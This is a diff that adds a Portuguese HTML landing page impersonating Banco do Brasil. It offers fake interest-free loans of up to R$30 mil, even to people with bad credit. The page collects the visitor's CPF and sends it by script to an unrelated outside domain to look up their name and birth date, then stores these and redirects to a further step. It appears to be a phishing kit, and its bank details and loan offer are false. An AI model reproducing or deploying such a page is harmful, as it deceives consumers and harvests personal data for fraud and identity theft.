@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco do Brasil - Empréstimo Educacional | Simule Agora até R$ 30 mil</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/styles.css">
+
+  <!-- Pixel de rastreamento -->
+  <meta charset="utf-8">
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+  <script>
+    window.pixelId = "6859e32ca14726c70bec872f";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+</head>
+
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="container header-container">
+      <img src="images/logobrasil.png" alt="Banco do Brasil" class="logo">
+      <a href="#simular" class="btn btn-primary">Solicitar Empréstimo</a>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <section class="hero">
+    <div class="container hero-container">
+      <div class="hero-content">
+        <h1 class="hero-title">Aproveite Agora!</h1>
+        <h2 class="hero-subtitle">Empréstimo de até 30 mil reais!</h2>
+        <p class="hero-text">Comece a pagar somente em <strong>Novembro de 2025</strong>! Lançamento com limites de
+          crédito R$10 mil até 30 mil <strong>sem juros</strong>, disponíveis até mesmo para negativados. Aproveite
+          benefícios exclusivos e comece sua jornada rumo independência financeira hoje mesmo!</p>
+
+        <div class="hero-features">
+          <div class="hero-feature">
+            <div class="hero-feature-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <polyline points="12 6 12 12 16 14"></polyline>
+              </svg>
+            </div>
+            <div class="hero-feature-text">
+              <strong>Sem juros</strong>
+              Condições especiais
+            </div>
+          </div>
+
+          <div class="hero-feature">
+            <div class="hero-feature-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                <line x1="16" y1="2" x2="16" y2="6"></line>
+                <line x1="8" y1="2" x2="8" y2="6"></line>
+                <line x1="3" y1="10" x2="21" y2="10"></line>
+              </svg>
+            </div>
+            <div class="hero-feature-text">
+              <strong>Pague em Novembro de 2025</strong>
+
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-card" id="simular">
+        <h3 class="form-title">Peça o seu novo empréstimo Banco do Brasil</h3>
+        <p class="form-subtitle">Preencha seus dados para continuar</p>
+
+        <div class="form-group">
+          <input type="text" class="form-input" placeholder="000.000.000-00" id="cpf-input">
+          <p class="form-help">Digite seu CPF para simular</p>
+        </div>
+        <button class="form-button" type="button">
+
+          Solicitar Empréstimo
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="btn-icon">
+            <line x1="5" y1="12" x2="19" y2="12"></line>
+            <polyline points="12 5 19 12 12 19"></polyline>
+          </svg>
+        </button>
+
+
+        <div class="form-security">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+          Seus dados estão protegidos e seguros
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <script src="js/jquery.min.js"></script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const cpfInput = document.getElementById('cpf-input');
+      const submitBtn = document.querySelector('.form-button');
+
+      // Função para validar CPF
+      function validarCPF(cpf) {
+        cpf = cpf.replace(/[^\d]+/g, '');
+        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+
+        let soma = 0, resto;
+        for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
+        resto = (soma * 10) % 11;
+        if (resto === 10 || resto === 11) resto = 0;
+        if (resto !== parseInt(cpf[9])) return false;
+
+        soma = 0;
+        for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
+        resto = (soma * 10) % 11;
+        if (resto === 10 || resto === 11) resto = 0;
+
+        return resto === parseInt(cpf[10]);
+      }
+
+      // Monitorar e ativar/desativar botão
+      cpfInput.addEventListener('input', function () {
+        const cpf = cpfInput.value;
+        submitBtn.disabled = !validarCPF(cpf);
+        submitBtn.style.opacity = validarCPF(cpf) ? '1' : '0.5';
+      });
+
+      // Substitui comportamento do botão
+      submitBtn.addEventListener('click', async function (e) {
+        e.preventDefault();
+
+        // Altera o texto do botão
+        submitBtn.innerHTML = 'Carregando...';
+
+        const cpf = cpfInput.value.replace(/[^\d]+/g, '');
+        if (!validarCPF(cpf)) {
+          alert('CPF inválido. Por favor, insira um CPF válido.');
+          submitBtn.innerHTML = 'Solicitar Empréstimo';
+          return;
+        }
+
+        localStorage.setItem('cpf', cpf);
+
+        let nomeCompleto = "Cliente Banco do Brasil";
+        let primeiroNome = "Cliente";
+        let nascimento = null;
+
+        try {
+          const response = await fetch('https://concursos-edital.online/v1/consulta00itau/' + encodeURIComponent(cpf), {
+            method: 'GET',
+            headers: {
+              'user-agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36'
+            }
+          });
+
+          if (response.ok) {
+            const data = await response.json();
+
+            if (data?.nome) {
+              nomeCompleto = data.nome;
+              primeiroNome = nomeCompleto.split(" ")[0];
+              nascimento = data.nascimento || null;
+            }
+          }
+        } catch (error) {
+          // mantém dados padrão
+        }
+
+        sessionStorage.setItem('primeiroNome', primeiroNome);
+        sessionStorage.setItem('cpf', cpf);
+        sessionStorage.setItem('nomeCompleto', nomeCompleto);
+        sessionStorage.setItem('dataNascimento', nascimento);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const redirectUrl = '/01' + (urlParams.toString() ? '?' + urlParams.toString() : '');
+        window.location.href = redirectUrl;
+      });
+
+      // Inicia botão desativado
+      submitBtn.disabled = true;
+      submitBtn.style.opacity = '0.5';
+    });
+  </script>
+
+
+  <!-- Benefits Section -->
+  <section class="benefits">
+    <div class="container">
+      <h2 class="section-title">Vantagens do <span style="color: #3354fd;">Banco do Brasil</span></h2>
+      <p class="section-subtitle">Condições especiais pensadas para você realizar seus objetivos sem comprometer seu
+        orçamento atual</p>
+
+      <div class="benefits-grid">
+        <div class="benefit-card benefit-card-highlight">
+          <h3 class="benefit-title benefit-title-highlight">Sem análise de crédito rigorosa</h3>
+          <p class="benefit-text">Aprovação facilitada, mesmo para quem está negativado</p>
+        </div>
+
+        <div class="benefit-card benefit-card-highlight">
+          <h3 class="benefit-title benefit-title-highlight">Pagamento só em novembro</h3>
+          <p class="benefit-text">Comece a pagar somente a partir de Novembro de 2025</p>
+        </div>
+
+        <div class="benefit-card">
+          <h3 class="benefit-title">100% digital</h3>
+          <p class="benefit-text">Todo o processo online, rápido e seguro</p>
+        </div>
+
+        <div class="benefit-card">
+          <h3 class="benefit-title">Aprovação em 24h</h3>
+          <p class="benefit-text">Resposta rápida para seu pedido</p>
+        </div>
+
+        <div class="benefit-card">
+          <h3 class="benefit-title">Até R$ 30 mil</h3>
+          <p class="benefit-text">Valores de R$ 10 mil até R$ 30 mil disponíveis</p>
+        </div>
+
+        <div class="benefit-card">
+          <h3 class="benefit-title">Atendimento especializado</h3>
+          <p class="benefit-text">Suporte dedicado durante todo o processo</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Stats Section -->
+  <section class="stats">
+    <div class="container">
+      <div class="stats-container">
+        <h2 class="section-title">Confie na maior cooperativa do Brasil</h2>
+        <p class="section-subtitle">Mais de 30 anos cuidando do seu futuro financeiro</p>
+
+        <div class="stats-grid">
+          <div class="stat-item">
+            <div class="stat-number">+5Mi</div>
+            <div class="stat-label">Cooperados</div>
+          </div>
+
+          <div class="stat-item">
+            <div class="stat-number">30+</div>
+            <div class="stat-label">Anos de mercado</div>
+          </div>
+
+          <div class="stat-item">
+            <div class="stat-number">1000+</div>
+            <div class="stat-label">Agências</div>
+          </div>
+
+          <div class="stat-item">
+            <div class="stat-number">98%</div>
+            <div class="stat-label">Satisfação</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-top">
+        <div class="footer-info">
+          <img src="images/logobrasil.png" alt="Banco do Brasil" class="footer-logo">
+          <p class="footer-text">O Banco do Brasil é a maior cooperativa de crédito do Brasil, comprometida em oferecer soluções
+            financeiras justas e acessíveis para realizar seus sonhos.</p>
+
+          <div class="footer-contact">
+            <div class="footer-contact-item">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z">
+                </path>
+              </svg>
+            </div>
+
+            <div class="footer-contact-item">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                <polyline points="22,6 12,13 2,6"></polyline>
+              </svg>
+              <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1c7d687972787571797268735c7e7e327f7371327e6e">[email�protected]</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="footer-links">
+          <div class="footer-links-column">
+            <h4 class="footer-links-title">Links Importantes</h4>
+            <ul class="footer-links-list">
+              <li class="footer-link"><a href="#">Sobre o Banco do Brasil</a></li>
+              <li class="footer-link"><a href="#">Produtos e Serviços</a></li>
+              <li class="footer-link"><a href="#">Encontre uma Agência</a></li>
+              <li class="footer-link"><a href="#">Central de Ajuda</a></li>
+            </ul>
+          </div>
+
+          <div class="footer-links-column">
+            <h4 class="footer-links-title">Informações Legais</h4>
+            <ul class="footer-links-list">
+              <li class="footer-link"><a href="#">Termos de Uso</a></li>
+              <li class="footer-link"><a href="#">Política de Privacidade</a></li>
+              <li class="footer-link"><a href="#">Código de Conduta</a></li>
+              <li class="footer-link"><a href="#">Ouvidoria</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <div class="footer-disclaimer">
+
+        </div>
+
+        <div class="footer-copyright">
+          © 2025 Banco do Brasil - Sistema de Cooperativas de Crédito do Brasil. Todos os direitos reservados.
+        </div>
+
+        <div class="footer-legal">
+          CNPJ: 00.000.000/0001-91<br>
+          Autorizado pelo Banco Central do Brasil
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- JavaScript -->
+  <script data-cfasync="false" src="js/email-decode.min.js"></script><script>
+    // Máscara para o campo de CPF
+    document.getElementById('cpf-input').addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 11) {
+        value = value.slice(0, 11);
+      }
+
+      if (value.length > 9) {
+        value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+      } else if (value.length > 6) {
+        value = value.replace(/^(\d{3})(\d{3})(\d{0,3}).*/, '$1.$2.$3');
+      } else if (value.length > 3) {
+        value = value.replace(/^(\d{3})(\d{0,3}).*/, '$1.$2');
+      }
+
+      e.target.value = value;
+    });
+
+    // Rastreamento de eventos
+    document.querySelector('.form-button').addEventListener('click', function () {
+      // Registrar evento de clique no botão
+      if (typeof fbq === 'function') {
+        fbq('track', 'Lead');
+      }
+    });
+  </script>
+
+
+</body></html>
